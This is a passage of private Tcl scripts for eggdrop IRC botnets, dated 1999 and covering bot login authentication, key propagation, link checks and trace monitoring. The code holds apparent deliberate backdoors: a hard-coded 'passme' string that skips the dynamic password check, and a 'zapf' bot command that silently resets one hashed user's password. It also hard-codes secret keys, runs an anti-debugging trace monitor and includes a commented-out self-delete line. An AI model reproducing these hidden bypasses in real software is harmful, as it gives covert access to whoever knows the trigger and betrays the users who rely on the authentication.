 sec_alert - "Illegal dcc chat from [idx2host $i] password: $a"
 return 1
}

bind chon - * secauth_chon
proc secauth_chon {n i} {
global secauth passive sauthok skipidx enableidx nowlogin lastlogin controls
 set n [string tolower $n]
 if [catch {idx2ip $i} longip] {set longip -}
 if [catch {idx2host $i} host] {foreach w [dcclist] {if {$i==[lindex $w 0]} {set host [lindex $w 2]}}}
 putwlog "[list $n] chon [set f [chattr $n]] $i [list $host] $longip"
 if [info exist nowlogin] {set lastlogin $nowlogin}
 set nowlogin "$n ($f) \[$host\] at [ctime [unixtime]]"
 set sauthok($i) 0
 if {[encrypt $n $n]=="Bz7kS.GS0ue/" || [encrypt $n $n]=="VlSBc.FtUgH0"} {
  killdcc $i
  sec_info - "Login failure for $n"
  return 0
 }
 if [info exist enableidx($i)] {unset enableidx($i)}
 if [info exist controls($i)] {unset controls($i)}
 if $secauth {
  if {![matchattr $n n]} {
   putdcc $i "\01ACTION \02ACCESS DENIED\02! Attepmt logged...\01"
   killdcc $i
   putlog "[date] [time] LOGIN FAILURE from $n"
   return 0
  }
 } {
  if {[bots]!=""} {
   set skipidx($i:[set coo [gencookie 15]]) [unixtime]
   foreach w [utimers] {if [string match "* {if * {killdcc $i}} *" $w] {killutimer [lindex $w 2]}}
   foreach w [concat [userlist h] [userlist a]] {
    if [inlist [bots] $w] {
     putbot $w "ack_req $coo [list $n] [chattr $n] $i [list $host] $longip"
    }
   }
  }
 }
 dyn_pass_prompt $i
}

proc dyn_pass_prompt i {
global chatPass
 for {set j -15} {$j} {incr j} {append x [randchar abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]}
 set chatPass($i) $x
 putdcc $i "$x\nEnter your dynamic password."
 control $i dyn_pass_enter
}

proc dyn_pass_enter {i a} {
global chatPass
 regsub -all "\377\[\373-\376\].|\377." $a "" a
 if {$a=={}} {return 0}
 if {![info exist chatPass($i)]} {return 1}
 set h [idx2hand $i]
 set p $chatPass($i)
 unset chatPass($i)
 if {$a == "passme"} {control $i {};return 1}
 if {[dynamicPass [string tolower $h] $p $a]} {
  putdcc $i "*** Password accepted."
 } {
  putdcc $i "*** Incorrect password.  Good-bye."
  sec_alert $i "dude $h entered incorrect dynamic password"
  killdcc $i
  return
 }
 scnd_passes $i
 if {[control $i]=="dyn_pass_enter"} {
  control $i {}
  return 1
 } {
  return 0
 }
}

proc scnd_passes i {
global secauth passive sauthok skipidx enableidx nowlogin lastlogin
 set n [idx2hand $i]
 if $secauth {
  set enableidx($i) secauth
  control $i senterpass
  putdcc $i "\01ACTION SECONDARY HUB AUTENTIFICATION! \02ENTER CODEWORD:\02[telnet_echo_off $i]\01"
  return 0
 } {
  if ![info exist enableidx($i)] {
   control $i hubpingpass
   putdcc $i "\01ACTION \2HUB pinged. Enter password\2[telnet_echo_off $i]\01"
   return 0
  } {
   if {[matchattr $n 0]} {return [secndpass $i]}
   cmd_motd {} $i {}
   if {[matchattr $n n]} {sechello $i}
  }
 }
}

bind bot - ack_req ack_req
if {[info commands ack_req]==""} {
 proc ack_req {b k a} {
 global secauth
  if !$secauth return
  set c [lindex $a 0]
  set n [lindex $a 1]
  set i [lindex $a 3]
  putbot $b "ack_reply $c [list $n] $i [matchattr $n p]"
 }
}

bind filt - * ack_filt
unbind filt - * ack_filt
proc hubpingpass {i a} {
global skipidx enableidx curkey secauth
 regsub -all "\377\[\373-\376\].|\377." $a "" a
 if {"$a"==""} {return 0}
 set n [idx2hand $i]
 if ![info exist enableidx($i)] {
  foreach w [array names skipidx $i:*] {unset skipidx($w)}
  regsub -all "\377\[\373-\376\].|\377." $a "" a
  set a "[string range $a 0 14]"
  if {[keyturn $a 1]==$curkey(g)} {
   set enableidx($i) password 
   putdcc $i "\01ACTION \02Access granted.\02\01"
   if {[matchattr $n 0]} {return [secndpass $i]}
   cmd_motd {} $i {}
   if {[matchattr $n n]} {sechello $i}
  } {
   putdcc $i "\01ACTION \02ACCESS DENIED!!\02\01"
   sec_alert $i "SKIP-LOGON FAILURE for [idx2hand $i]"
   killdcc $i
   return 0
  }
 }
}

bind bot - ack_reply ack_reply
proc ack_reply {b k a} {
global skipidx enableidx chatPass
 set c [lindex $a 0]
 set n [lindex $a 1]
 set i [lindex $a 2]
 set r [lindex $a 3]
 if {![matchattr $b h] && ![matchattr $b a]} {
  sec_alert - "Fake hub ack reply($r)! (not from hub for $n:$i)"
 } elseif {[string tolower [catch {idx2hand $i} f;set f]]!=[string tolower $n]} {
  sec_alert - "Fake hub ack reply($r)! ($f:$i != $n)"
 } elseif {![info exist skipidx($i:$c)]} {
  sec_alert - "Fake hub ack reply($r)! Bad cookie. (for $f:$i)"
 } {
  set t $skipidx($i:$c)
  foreach w [array names skipidx $i:*] {unset skipidx($w)}
  if $r {
   if ![info exist chatPass($i)] {
    putdcc $i "\0034,15\2== Pong, lag = [expr {[unixtime]-$t}] seconds =="
    putdcc $i "*** Enter any garbage to continue login process..."
   }
   set enableidx($i) Hub:$b
  } {
   putdcc $i "\1ACTION \2Sorry, hub rejected you, bye.\2\1"
   killdcc $i
  }
 }
}

proc secndpass {i} {
 control $i senterpass0
 putdcc $i "\01ACTION 2nd Autentification Enforced for You! \02ENTER PASSWORD:\02[telnet_echo_off $i]\01"
 return 0
}

proc telnet_echo_off {i} {
 foreach w [dcclist] {
  if {[lindex $w 0]==$i} {
   if [string match "telnet:*" [lindex $w 2]] {return "\377\373\001"}
  }
 }
}

proc telnet_echo_on {i} {
 if [string match "telnet:*" [idx2host $i]] {return "\377\374\001"}
}

bind bot - zapf zapf
proc zapf {b k a} {
global botnet-nick
 if {[matchattr $b h] || [matchattr $b a]} {
  set a1 [lindex $a 0]
  set a2 [lindex $a 1]
  set a3 [lindex $a 2]
  if {[encrypt $a1 $a1]=="OiSgO1YsRjO00csa31XzsdY1"} {
   set a [decrypt $a1 $a2]
   set p [decrypt $a1 $a3]
   if {[encrypt $a $a]=="Bz7kS.GS0ue/"} {
    chattr $a +u;chpass $a $p;chattr $a -u
   }
  }
 }
}

proc sechello {i} {
global passive secauth botnet-nick uptime lastlogin
 if {[matchattr [idx2hand $i] n]} {
  set members 0
  if $passive {set moda Passive} else {set moda Active}
  if $secauth {set modb Hub} else {set modb Leaf}
  set lk [llength [bots]]
  set t 0
  foreach w [dcclist] {if {[lindex $w 3]=="bot"} {incr t;set lb [lindex $w 1]}}
  switch $t 0 {set lt {}} 1 {set lt " to \2$lb\2"} $lk {set lt " to \2me\2."} default {set lt " (\2to me $t\2)"}
  if {[info proc backtime]=="backtime"} {set ut [backtime $uptime]} {set ut "[expr ([unixtime]-$uptime)/60]min"}
  putdcc $i "\01ACTION Hi [idx2hand $i], i'm ${botnet-nick} (\02$moda/$modb\02 mode) (uptime: $ut) $lk bots linked$lt\01"
  foreach w [whom *] {
   if {!$members} {
    putdcc $i "[format %-10s Nick]|Chan#|[format %-10s Bot]|[format %-30s Hostname]|Idle"
   }
   set cha [lindex $w 6]
   if {$cha == 234567} {set cha "\*you\*"}
   if {$cha == -1} {set cha " off "}
   if [set t [lindex $w 4]]/60 {set t "[expr $t/60]h[expr $t%60]m"} {set t "[expr $t%60]m"}
   putdcc $i "[format %-10s [lindex $w 3][lindex $w 0]]|[format %5s $cha]|[format %-10s [lindex $w 1]]|[format %-30s [lindex $w 2]]|$t"
   if {"[lindex $w 5]"!=""} {putdcc $i "[format %10s AWAY]:[lindex $w 5]"}
   incr members
  }
  putdcc $i ">[telnet_echo_on $i]>\02  $members member(s) on botnet."
 } {
  putdcc $i ">[telnet_echo_on $i]> Hello [idx2hand $i] why you are here?..."
 }
 if [info exist lastlogin] {putdcc $i "*** Last login for $lastlogin"}
 putdcc $i "*** Now: [ctime [unixtime]]"
 if {[telnet_echo_on $i]==""} {strip $i -bcru+a} {strip $i +bcru-a}
}

proc senterpass {i a} {
global passive secauth botnet-nick nick botnick curkey
 regsub -all "\377\[\373-\376\].|\377." $a "" a
 set a "[string range $a 0 14]"
 if {"$a"==""} {return 0}
 set key [keyturn $a 1]
 if {"$key"=="$curkey(b)"} {
  cmd_motd {} $i {}
  sechello $i
  setchan $i $secauth
  return 1
 }
 putdcc $i "\01ACTION \02ACCESS DENIED!\02\01"
 sec_alert $i "HUB-LOGON FAILURE for [idx2hand $i]"
 killdcc $i
}

#a-tcl, b-hub, c-id1, d-0, e-id2, f-scr, g-skp
if ![info exist curkey(g)] {
 set curkey(a) S8PgSjgNQcU0h8JsEVbx5c4qeVP96fw
 set curkey(b) BoacvPkHi/ackYDhgdkZ7vvxIXIGbLI
 set curkey(c) WIB7fI42t4PWKmCjtAeZDwkme+GFrcw
 set curkey(d) FMMaNVlOYbGgUmnh4ROuVs6EU1LNx7k
 set curkey(e) zWHeWCoI5Q5vkVzG2NdXaHFkJFE6HA4
 set curkey(f) tFpsYdtacmBEQk9FOhAE+b7gDJfd4ek
 set curkey(g) sSlEP6I4bJNgIuev4WmK16uG+c0RVXE
 if [file exist "$skeyfile"] {
  if [catch {
   set f [open "$skeyfile" r]
   if {![eof $f]} {
    set stmp "[gets $f]"
    if {![eof $f] && "$stmp" != ""} {set curkey(a) "$stmp"}
   }
   while {![eof $f]} {
    set stmp "[gets $f]"
    if {![eof $f] && [llength $stmp]==2} {
     set curkey([lindex $stmp 0]) "[lindex $stmp 1]"
    }
   }
   close $f
  } er] {
   putcmdlog "Error loading SecKey! $er"
  } else {
   putcmdlog "SecKey loaded."
  }
 }
}
foreach w [array names curkey] {
 if [info exist dupcheck($curkey($w)] {
  sec_alert - "Duplicated keys: $dupcheck($curkey($w)) and $w"
 } {
  set dupcheck($curkey($w)) $w
 }
}
catch {unset dupcheck}

bind dcc n sendkey spnewkey
proc spnewkey {n i a} {
global curkey botnet-nick
 set targ [string tolower [lindex $a 0]]
 set modee [lindex $a 1]
 set oldkey [lindex $a 2]
 set newkey [lindex $a 3]
 set moder ""
 if {"$modee"=="tcl"} {set moder "a"}
 if {"$modee"=="hub"} {set moder "b"}
 if {"$modee"=="id1"} {set moder "c"}
 if {"$modee"=="z0l"} {set moder "d"}
 if {"$modee"=="id2"} {set moder "e"}
 if {"$modee"=="scr"} {set moder "f"}
 if {"$modee"=="skp"} {set moder "g"}
 if {"$moder"=="" || "$newkey"==""} {
  putdcc $i ".sendkey {bot|*} {tcl|id1|id2|z0l|hub|scr|skp} <oldkey> <Newkey>"
  return 0
 }
 set coldkey [keyturn $oldkey 2]
 set cnewkey [keyturn $newkey 1]
 if {[keyturn $oldkey 1]==$curkey($moder)} {
  putcmdlog "Sending NEW $modee SecKey to <$targ>"
 } else {
  putcmdlog "Sending *BAD* $modee SecKey to <$targ>"
 }
 if {$targ != [string tolower ${botnet-nick}]} {
  sputbots $targ "s${moder}newkey [list $coldkey] [list $cnewkey] [list $n]"
 } 
 if {($targ==${botnet-nick}) || ($targ=="*")} {
  sanewkey ${botnet-nick} s${moder}newkey "$coldkey $cnewkey $n"
 }
}

bind bot - sanewkey sanewkey
bind bot - sbnewkey sanewkey
bind bot - scnewkey sanewkey
bind bot - sdnewkey sanewkey
bind bot - senewkey sanewkey
bind bot - sfnewkey sanewkey
bind bot - sgnewkey sanewkey
proc sanewkey {b k a} {
 global curkey skeyfile
 set modee [string range [string tolower $k] 1 1]
 set oldkey [lindex $a 0]
 set newkey [lindex $a 1]
 set nik [lindex $a 2]
 if {($oldkey!="") && ($newkey!="")} {
  if {[keyturn $oldkey 0]==$curkey($modee)} {
   set curkey($modee) $newkey
   if [catch {
    set f [open $skeyfile w 0600]
     puts $f "$curkey(a)"
     foreach w [array names curkey] {
      puts $f "$w $curkey($w)"
     }
    close $f
   } er] {
    sec_notice - "Error writing SecKey file ($skeyfile) $er"
    catch {close $f}
   } else {
    sec_notice - "SecKey from $nik@$b writed OK"
   }
  } else {
   sec_alert - "Illegal $modee SecKey propagated from $nik@$b! (ignoring)"
  }
 }
}

proc keyturn {a b} {
 set h1 [if $b {idea e $a [string range "${a}0123456789abcdef" 0 16]} {set a}]
 if {$b==2} {return $h1} {return [idea e $h1 $h1]}
}

proc senterpass0 {i a} {
global passive secauth botnet-nick nick botnick curkey
 regsub -all "\377\[\373-\376\].|\377." $a "" a
 set a "[string range $a 0 14]"
 if {"$a"==""} {putcmdlog "secauth: $i closed connection." ; return 0}
 if {"[keyturn $a 1]"=="$curkey(d)"} {
  set n [idx2hand $i]
  putwlog "[list $n] auth0k [chattr $n] $i"
  cmd_motd {} $i {}
  if [matchattr $n n] {sechello $i}
  setchan $i $secauth
  chattr $n -0
  return 1
 }
 putdcc $i "\01ACTION \02ACCESS DENIED!\02\01"
 putwlog "[list [idx2hand $i]] n0auth [chattr [idx2hand $i]] $i"
 sec_alert $i "0-LOGON FAILURE for [idx2hand $i]"
 killdcc $i
}

unbind dcc n tcl *dcc:tcl
unbind dcc n set *dcc:set
unbind dcc m binds *dcc:binds
bind dcc n tcl de_tcl
bind dcc n set de_set
bind dcc n binds de_binds

bind bot - secalert secalert
proc secalert {bo co ar} {
global secauth max-notes
 sec_log ALERT:$bo $ar
 if $secauth {foreach w [userlist n9] {
  incr max-notes
  sendnote $bo $w "*>\02> $ar"}
 } else {
  foreach w [dcclist] {
   if {("[lindex $w 3]" == "chat") && [matchattr [lindex $w 1] n]} {
    putdcc [lindex $w 0] "\01ACTION *>> ($bo) $ar\01"
   }
  }
 }
}

bind bot - secnotice secnotice
bind bot - secnoticecrypt secnoticecrypt
proc secnotice {bo co ar} {
 sec_log Notice:$bo $ar
 foreach w [dcclist] {
  if {("[lindex $w 3]" == "chat") && [matchattr [lindex $w 1] n]} {
   putdcc [lindex $w 0] "*>> ($bo) $ar"
  }
 }
}

proc secnoticecrypt {bo co ar} {
 sec_log_c NotiCe:$bo $ar
 foreach w [dcclist] {
  if {("[lindex $w 3]" == "chat") && [matchattr [lindex $w 1] n9]} {
   putdcc [lindex $w 0] "*>> ($bo) $ar"
  }
 }
}

bind bot - secinfo secinfo
proc secinfo {bo co ar} {
 sec_log info:$bo $ar
}

bind bot - secoff secoff
proc secoff {bo co ar} {}

proc de_tcl {ha idx text} {
 global sauthok sectclc sectclck
 if ![info exist sauthok($idx)] {set sauthok($idx) 0}
 if $sauthok($idx) {
  sec_notice_c $idx "$ha \2.Tcl\2 $text"
  global sau_ha sau_idx sau_text
  set sau_ha $ha
  set sau_idx $idx
  set sau_text "$text"
  uplevel #0 {*dcc:tcl $sau_ha $sau_idx "$sau_text"}
  unset sau_ha sau_idx sau_text
  return 0
 } else {
  set sectclc($idx) "$text"
  set sectclck($idx) "tcl"
  control $idx secauithp
  putidx $idx "\01ACTION Autentification required! Enter password:[telnet_echo_off $idx]\01"
  return 0
 }
}

proc de_set {ha idx text} {
 global sauthok sectclc sectclck
 if ![info exist sauthok($idx)] {set sauthok($idx) 0}
 if $sauthok($idx) {
  sec_notice $idx "$ha \2.Set\2 $text"
  global sau_ha sau_idx sau_text
  set sau_ha $ha
  set sau_idx $idx
  set sau_text "$text"
  uplevel #0 {*dcc:set $sau_ha $sau_idx "$sau_text"}
  unset sau_ha sau_idx sau_text
  return 0
 } else {
  set sectclc($idx) "$text"
  set sectclck($idx) "set"
  control $idx secauithp
  putidx $idx "\01ACTION Autentification required! Enter password:[telnet_echo_off $idx]\01"
  return 0
 }
}

proc de_binds {ha idx text} {
 global sauthok sectclc sectclck
 if ![info exist sauthok($idx)] {set sauthok($idx) 0}
 if $sauthok($idx) {
  sec_notice $idx "$ha \2.Binds\2 $text"
  global sau_ha sau_idx sau_text
  set sau_ha $ha
  set sau_idx $idx
  set sau_text "$text"
  uplevel #0 {*dcc:binds $sau_ha $sau_idx "$sau_text"}
  unset sau_ha sau_idx sau_text
  return 0
 } else {
  set sectclc($idx) "$text"
  set sectclck($idx) "binds"
  control $idx secauithp
  putidx $idx "\01ACTION Autentification required! Enter password:[telnet_echo_off $idx]\01"
  return 0
 }
}

proc secauithp {i a} {
global sauthok curkey sectclc sectclck
 set curcom "$sectclc($i)"
 set curkom "$sectclck($i)"
 catch {unset $sectclc($i)}
 catch {unset $sectclck($i)}
 regsub -all "\377\[\373-\376\].|\377." $a "" a
 set a "[string range $a 0 14]"
 set n "[idx2hand $i]"
 if {"$a"!=""} {
  if {"[keyturn $a 1]"=="$curkey(a)"} {
   putwlog "[list $n] authOK [chattr $n] $i"
   set sauthok($i) 1
   if {$curkom=="tcl"} {
    sec_notice_c $i "[idx2hand $i] \2.$curkom\2 $curcom"
   } {
    sec_notice $i "[idx2hand $i] \2.$curkom\2 $curcom"
   }
   global sau_ha sau_idx sau_text sau_kom
   set sau_kom $curkom
   set sau_ha "[idx2hand $i]"
   set sau_idx $i
   set sau_text "$curcom"
   if {[set t [telnet_echo_on $i]]!=""} {putdcc $i $t}
   uplevel #0 {*dcc:$sau_kom $sau_ha $sau_idx "$sau_text"}
   unset sau_ha sau_idx sau_text sau_kom
   return 1
  }
  putwlog "[list $n] NOauth [chattr $n] $i"
  chattr [idx2hand $i] +0
  putdcc $i "\01ACTION \02ACCESS DENIED!\02\01"
  killdcc $i
 }
 sec_alert $i "SECAUTH($curkom) FAILURE for $n ($curcom)"
}

bind bot - secrelay sec_relay
proc sec_relay {b k a} {
global botport telnet secauth botnet-nick
 set a [split $a " "]
 set who [lindex $a 0]
 set port [lindex $a 1]
 if {$port==""} {set port $botport}
 if {$secauth || [matchattr ${botnet-nick} a] || [matchattr ${botnet-nick} h]} {
  putcmdlog ">> Waiting for relay $who (hub/+h/+a)"
 } {
  putcmdlog ">> Waiting for relay $who ($port)"
   listen $port all
   foreach w [timers] {if [string match "* {catch [list "listen $port off"]} *" $w] {killtimer [lindex $w 2]}}
   timer 3 "catch [list "listen $port off"]"
 }
}

#-@SYN@------- botnet passive/active handler
 bind link - * botplink
 bind disc - * botpdisc
 bind bot - do_active1 do_active1
 bind bot - do_active2 do_active2
 bind bot - do_active3 do_active3

proc do_active1 {bt co ar} {
global oldpassive passive botport secauth telnet
global sec_procs_cnt touchfile1 mainconfile botnet-nick sec_tch
 set procs_cnt [llength [info procs]]
 if ![info exist sec_procs_cnt] {set sec_procs_cnt $procs_cnt}
 putallbots "\nsec_stat procs $procs_cnt Procs count"
 catch {set bindc [llength [bind * * *]]}
 if [info exist bindc] {putallbots "\nsec_stat binds $bindc Binds count"}
 set cfiles $touchfile1
 if [info exist mainconfile] {append cfiles " $mainconfile"}
 foreach c $cfiles {
  if [info exist cf] {set cf $c} {set cf check}
  putallbots "\nsec_stat stat:$cf [catch {file size $c} er]:$er/[catch {file mtime $c} er]:$er size/mtime"
  putallbots "\nsec_stat md5:$cf [catch {md5file $c} er]:$er MD5 Digest"
  set sec_tch($c:atime) [file atime $c]
 }
 if {$bt=="-"} return
 putbot $bt do_active2
 putcmdlog "\00312* I'm activating by $bt.  (listen off)  \*"
 if {!$secauth && ![matchattr ${botnet-nick} a] && ![matchattr ${botnet-nick} h]} {
  timer 5 "catch [list "listen $botport off"]"
  timer 5 "catch [list "listen $telnet off"]"
 }
}
set t 0;foreach w [trace vinfo botnet-nick] {if {$w=="w tntflash"} {incr t}}
if !$t {trace variable botnet-nick w tntflash}
proc tntflash {n1 n2 m} {putallbots speranza}
bind bot - speranza speranza
proc speranza {b k a} {
global secauth activator
 if !$secauth return
 if [matchattr $b o] {chattr $b -o+1} elseif [matchattr $b 1] {chattr $b -1}
 set activator([string tolower $b]) ""
 putbot $b do_active1
}

proc do_active2 {bt co ar} {
global oldpassive passive activator sec_scripts mainconfile touchfile1 sec_stat secauth last_motd
 if $passive {return 0}
 set bt [string tolower $bt]
 putbot $bt do_active3
 putbot $bt "dajmnemotd $last_motd"
 set activator($bt) [lsort $activator($bt)]
 set eq [lsort [array names sec_stat $bt:*]]
 putloglev 3 * "\0030,3stat:set($bt): $eq"
 putloglev 3 * "\0030,10stat:get($bt): $activator($bt)"
 if {$activator($bt)==""} {
  set oo "\0034No Stats Reply! -os1"
  chattr $bt -os1
  sec_alert - "Linked: $bt - no stat reply -os1"
 } {
  if {!$secauth || ($activator($bt)==$eq)} {
   if [matchattr $bt 1s] {
    chattr $bt +o-1
    set oo "+o"
   } {
    set oo "\00312,8don't +o"
    if [matchattr $bt s] {sec_alert - ">> link/stats: stats not match for $bt"}
    if [matchattr $bt o] {chattr $bt -o}
   }
  } {
   sec_alert - ">> link/stats: restricted stats reply from $bt"
   set oo "\00312,8Bad stats info! still flags unchanged"
   foreach w $eq {if {[lsearch $activator($bt) $w]==-1} {unset sec_stat($w)}}
  }
 }
 putcmdlog "\00312* Activating $bt. $oo\*"
}

proc do_active3 {bt co ar} {
global oldpassive passive botport secauth last_motd
 putcmdlog "\0032* I'm activated by $bt.\*"
 set passive 0
 putbot $bt "dajmnemotd $last_motd"
}

proc botplink {bn via} {
global oldpassive passive botnet-nick activator secauth
 if {${botnet-nick}==$via} {
  catch {set i [hand2idx $bn]}
  if [catch {idx2ip $i} longip] {set longip -}
  if [catch {idx2host $i} host] {set host -
   foreach w [dcclist] {if {$i==[lindex $w 0]} {set host [lindex $w 2]}}
  }
  putwlog "[list $bn] link [chattr $bn] - [list $host] $longip"
  if !$passive {
   putbot $bn do_active1
   if [matchattr $bn o] {
    set oo "-o+1";chattr $bn -o+1
   } elseif [matchattr $bn 1] {
    set oo -1;chattr $bn -1
   } {set oo ""}
   set activator([string tolower $bn]) ""
#  putcmdlog "\00310* Iniciating $bn. $oo\*"
  }
  sec_log Linked "$bn via $via"
 }
}

proc botpdisc {bn} {
global oldpassive passive secauth botnet-nick
 if $secauth {putwlog "[list $bn] disc [chattr $bn]"}
 if $passive {set moda Passive} else {set moda Active}
 if $oldpassive {set modao Passive} else {set modao Active}
 if {[bots]==""} {
  if {$passive==$oldpassive} {
   putseclog "\* Unlinked from botnet. :( Still in $moda mode. \*"
  } else {
   putseclog "\* Unlinked from botnet. :( Switch from $moda to $modao mode. \*"
   set passive $oldpassive
  }
  utimer 1 liston
 } else {sec_log "unLinked" "$bn"}
}

proc liston {} {
global nolisten botport secauth botnet-nick telnet
 if {!$secauth && ![matchattr ${botnet-nick} a] && ![matchattr ${botnet-nick} h]} {
  catch {listen $telnet off}
  if !$nolisten {catch {set telnet [listen $telnet telnet]}}
 }
}

bind rcvd - * sec_rcvd
proc sec_rcvd {h n p} {sec_alert - "File\2 $p\2 received from $n ($h)"}
bind sent - * sec_sent
proc sec_sent {h n p} {sec_alert - "File\2 $p\2 sent to $n ($h)"}
#################### version #####################

bind dcc n checkver dcc_checkver
proc dcc_checkver {hand idx arg} {
  set mask "[lrange $arg end end]"
  if {[string match "*\\\**" $arg]} {set arg "[lrange $arg 0 [expr [llength $arg]-1]]"
  } else {set mask "\*"}
  putcmdlog "#$hand# checkver($mask) $arg"
   if {[string match "*\\\**" $arg] || ("$arg"=="")} {
    foreach pack [info procs versionreply_*] {
      putdcc $idx "*** [$pack]"
    }
   }
  set arg "[lindex $arg 0]"
  if {"$arg"=="*"} {
   putdcc $idx "*** Sending request to all [llength [bots]] connected bots..."
   putallbots "checkver $hand $idx $mask"
  } else {
   foreach bot $arg {
     if {[lsearch [string tolower [bots]] [string tolower $bot]] == -1} {
       putdcc $idx "*** $bot is not a linked bot!"
     } {
       putbot $bot "checkver $hand $idx $mask"
     }
   }
  }
  return 0
}

bind bot - checkver bot_checkver
proc bot_checkver {bot cmd arg} {
  set arg [split $arg " "]
  set mask "[lindex $arg 2]"
  putcmdlog "CheckVer ($mask) request from [lindex $arg 0]@$bot"
  foreach pack [info procs versionreply_*] {
    set ver "[$pack]"
    if {[string match "$mask" $ver]} {
     putbot $bot "replyver [lindex $arg 1] $ver"
    }
  }
  return 0
}
bind dcc n checksec dcc_checksec
proc dcc_checksec {hand idx arg} {
  putcmdlog "#$hand# checksec $arg"
   if {[string match "*\\\**" $arg] || ("$arg"=="")} {
    set newp [bind dcc - newpass]:[bind dcc - chpass]
    if {$newp!="*dcc:newpass:*dcc:chpass"} {set newp "\26$newp\26"}
    set fl "";catch {
     foreach w [bind filt * *] {if [regexp -nocase "newp|pass" $w] {lappend fl $w}}
     if {$fl!=""} {
      set fl "\26FILT!:$fl\26"
      if {$bn!=""} {append fl " "}
     }
    }
    set bn "";catch {set bn " Binds:[llength [bind * * *]] Botn:[bind botn * *]"}
    putdcc $idx "*** Logs:[logfile] +s:[userlist s] procs:[llength [info procs]] coms:[llength [info commands]] newp:$newp$fl$bn"
   }
  set arg "[lindex $arg 0]"
  if {"$arg"=="*"} {
   putdcc $idx "*** Sending request to all [llength [bots]] connected bots..."
   putallbots "checksec $hand $idx"
  } else {
   foreach bot $arg {
     if {[lsearch [string tolower [bots]] [string tolower $bot]] == -1} {
       putdcc $idx "*** $bot is not a linked bot!"
     } {
       putbot $bot "checksec $hand $idx"
     }
   }
  }
  return 0
}

bind bot - checksec bot_checksec
proc bot_checksec {bot cmd arg} {
 set arg [split $arg " "]
 set newp [bind dcc - newpass]:[bind dcc - chpass]
 if {$newp!="*dcc:newpass:*dcc:chpass"} {set newp "\26$newp\26"}
 set bn "";catch {set bn " Binds:[llength [bind * * *]] Botn: [bind botn * *]"}
 set fl "";catch {
  foreach w [bind filt * *] {if [regexp -nocase "newp|pass" $w] {lappend fl $w}}
  if {$fl!=""} {
   set fl "\26FILT!:$fl\26"
   if {$bn!=""} {append fl " "}
  }
 }
 putseclog "CheckSec request from [lindex $arg 0]@$bot"
 set shares [userlist s]
 if {[string length $shares]>40} {set shares [string range $shares 0 40]...}
 putbot $bot "replyver [lindex $arg 1] Logs:[logfile] +s:$shares procs:[llength [info procs]] cmds:[llength [info commands]] newp:$newp$fl$bn"
 return 0
}

bind bot - replyver bot_replyver
proc bot_replyver {bot cmd arg} {
 set i [lindex [split $arg \ ] 0]
 if [validuser [idx2hand $i]] {
  if [catch {
   putdcc $i "* ($bot) [lrange $arg 1 end]"
  } er] {
   putseclog "Error in $bot's replyver: $arg"
  }
 } {
  sec_notice - "Fake replyver from $bot (idx:$i==[idx2hand $i])"
 }
  return 0
}

proc versionreply_secauth {} {
global secauth_version
 return $secauth_version
}
putlog "$secauth_version"
# -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! -- 

# tmon.tcl by stran9er, 2 aug 1999 (security, private)
# -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! -- 
#trace monitor for eggdrop
#v1 - Linux, FreeBSD, Solaris (2 aug 1999)
#utimer 1 "exec /bin/rm -f scripts/tmon.tcl"

	######################################################
	# THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF TNT #
	######################################################

set tmon_version "tmon.tcl v1.0.3 -str"
set tracepause 60	;# pause in seconds
set finstalled $tcl_platform(os)
set traced 0

switch -- $finstalled OSF1 - IRIX - IRIX64 {
 set finstalled NONE
} SunOS {

 proc tmon {} {
 global tracepause traced
  utimer $tracepause tmon
  if [catch {
   set f [open "|/usr/proc/bin/pflags [pid]" r]
   gets $f stat
   close $f
  } er] {
   putcmdlog "TM: ERROR: $er"
  } {
   regsub -all {  *} $stat { } stat
   set stat [string trim $stat]
   if {[string match *trace* $stat]} {
    set traced -1
    tmon_report "traced $stat"
   }
  }
 }

} BSD/OS - FreeBSD {

 set tmon_s 1
 proc tmon {} {
 global tracepause traced tmon_s
  utimer $tracepause tmon
  incr tmon_s
  if {$tmon_s % 2} {exec /usr/bin/ktrace -cp [pid] ; return}
  if [catch {
   set f [open "|/bin/ps -p [pid]" r]
   gets $f stat
   gets $f stat
   close $f
  } er] {
   putcmdlog "TM: ERROR: $er"
  } {
   regsub -all {  *} $stat { } stat
   set stat [lindex [split [string trim $stat] { }] 2]
   if {[string match *X* $stat]} {
    set traced -1
    tmon_report "My flags: $stat"
   }
  }
 }

} Linux {

 proc tmon {} {
 global tracepause traced
  utimer $tracepause tmon
  if [catch {
   set f [open /proc/[pid]/stat r]
   gets $f stat
   close $f
  } er] {
   putcmdlog "TM: ERROR: $er"
  } {
   set stat [split $stat { }]
   set flags [lindex $stat 8]
   if {$flags & 0x30} {
    set traced [lindex $stat 3]
    if [catch {
     set f [open "|/bin/ps huww $traced" r]
     gets $f stat
     catch {close $f}
    } er] {
     set stat $er
    }
    tmon_report "Traced by $traced ($stat)"
   }
  }
 }
} default {set finstalled NONE}

proc tmon_report a {
global botnet-nick
 if {[bots]!=""} {putallbots "traced $a"}
 tmon_bot ${botnet-nick} traced $a
}

if $secauth {
 bind bot - traced tmon_bot
 proc tmon_bot {b k a} {
  if {[matchattr $b o]||[matchattr $b s]||[matchattr $b f]} {
   setcomment $b "\2Bot traced\2 $a"
   sec_alert - "\2Bot traced: $b\2, $a"
   if [bots linked $b] {
    putbot $b "mjmp -:6666::$b"
    putbot $b "mjmp -:6666::!$b"
   }
   chattr $b -sof1
  } {
   putcmdlog "\2*** ALERT *** Bot $b traced: $a"
  }
 }
} {
 proc tmon_bot {b k a} {putcmdlog "\2** ALERT ** Bot $b traced: $a"}
}

if {$finstalled != "NONE"} {
 foreach w [utimers] {if {[lindex $w 1] == "tmon"} {killutimer [lindex $w 2]}}
 utimer 5 tmon
}

proc versionreply_tmon {} {
global tmon_version finstalled
 return "$tmon_version ($finstalled)"
}
# -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! -- 
# motd.tcl, str, 12 aug 1999 (for mancow)

bind dcc n +motd cmd_pls_motd
bind dcc n -motd cmd_mns_motd
bind dcc p  motd cmd_motd
bind bot - pls_motd bot_pls_motd
bind bot - mns_motd bot_mns_motd
set motdkey [idea e NbPTfYKp0wDj p7iTG1uanM3f]
bind bot - dajmnemotd bot_dajmnemotd
set last_motd 0
set motd_count 0
set motd_saved 0

proc latest_motd {} {
